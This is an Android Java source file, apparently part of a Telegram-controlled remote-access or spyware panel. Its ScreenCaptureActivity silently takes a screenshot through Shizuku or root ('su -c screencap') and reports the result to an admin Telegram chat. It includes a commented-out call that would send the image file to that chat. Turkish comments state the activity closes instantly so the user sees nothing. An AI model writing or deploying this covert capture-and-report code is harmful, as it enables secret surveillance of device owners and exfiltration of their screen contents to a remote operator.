package com.java.panel;

import android.os.Bundle;
import android.os.Environment;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class ScreenCaptureActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        new Thread(() -> {
            try {
                File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
                if (!dir.exists()) dir.mkdirs();

                File imageFile = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
                String path = imageFile.getAbsolutePath();

                // Shizuku veya Root yetkisi ile ekran görüntüsü al (Arayüz açılmaz, direkt arka planda çeker)
                boolean success = false;
                
                // Önce Shizuku ile dene
                try {
                    Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
                    Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
                    newProcessMethod.setAccessible(true);
                    Process process = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", "screencap -p " + path}, null, null);
                    if (process != null) {
                        process.waitFor();
                        if (imageFile.exists() && imageFile.length() > 0) success = true;
                    }
                } catch (Exception ignored) {}

                // Shizuku olmazsa standart Root / shell ile dene
                if (!success) {
                    Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p " + path});
                    process.waitFor();
                    if (imageFile.exists() && imageFile.length() > 0) success = true;
                }

                if (success && ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "📸 Ekran görüntüsü başarıyla alındı!");
                    // İstersen direkt Telegram'a dosyayı gönderelim:
                    // ShellService.instance.sendFileToTelegram(path, ShellService.instance.ADMIN_CHAT_ID);
                } else if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Ekran görüntüsü alınamadı (Shizuku veya Root izni gerekli).");
                }
            } catch (Exception e) {
                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Hata: " + e.getMessage());
                }
            }
            finish(); // İş bittiği gibi anında kapanır, kullanıcı hiçbir şey göremez
        }).start();
    }
}
